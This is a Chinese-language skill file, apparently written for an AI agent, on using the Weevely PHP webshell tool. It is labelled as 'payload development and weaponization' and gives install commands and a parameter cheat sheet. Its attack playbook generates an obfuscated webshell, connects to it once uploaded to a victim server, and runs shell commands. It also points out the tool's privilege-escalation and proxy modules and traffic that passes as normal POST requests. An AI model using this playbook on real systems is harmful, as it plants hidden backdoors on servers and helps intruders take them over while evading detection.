---
name: weevely-webshell
description: 渗透工具 skill:Weevely 的安装、参数速查与攻击场景 playbook。当任务涉及 载荷开发与武器化 需要调用 Weevely 时使用。
when-to-use: 渗透工具 skill:Weevely 的安装、参数速查与攻击场景 playbook。当任务涉及 载荷开发与武器化 需要调用 Weevely 时使用。
---

# Weevely

- 攻击大类:C07 载荷开发与武器化
- 上游仓库:https://github.com/epinna/weevely3
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
apt install weevely 或 git clone + pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `weevely generate password agent.php` | 生成混淆 webshell |
| `weevely http://target/agent.php password` | 连接 |
| `:shell_php` | 执行 PHP |
| `:file_upload/:file_download` | 文件传输 |
| `:net_ifconfig` | 内网信息 |
| `:audit_suid` | SUID 枚举 |

## 攻击场景 Playbook

### PHP webshell 全功能会话

```bash
weevely generate Pass123 /tmp/w.php  # 上传后
weevely http://victim/uploads/w.php Pass123
weevely> :shell_sh whoami
```

## 注意事项

混淆后的 PHP 后门自带 30+ 模块(SQL 访问/权限提升/代理);流量可伪装为正常 POST。
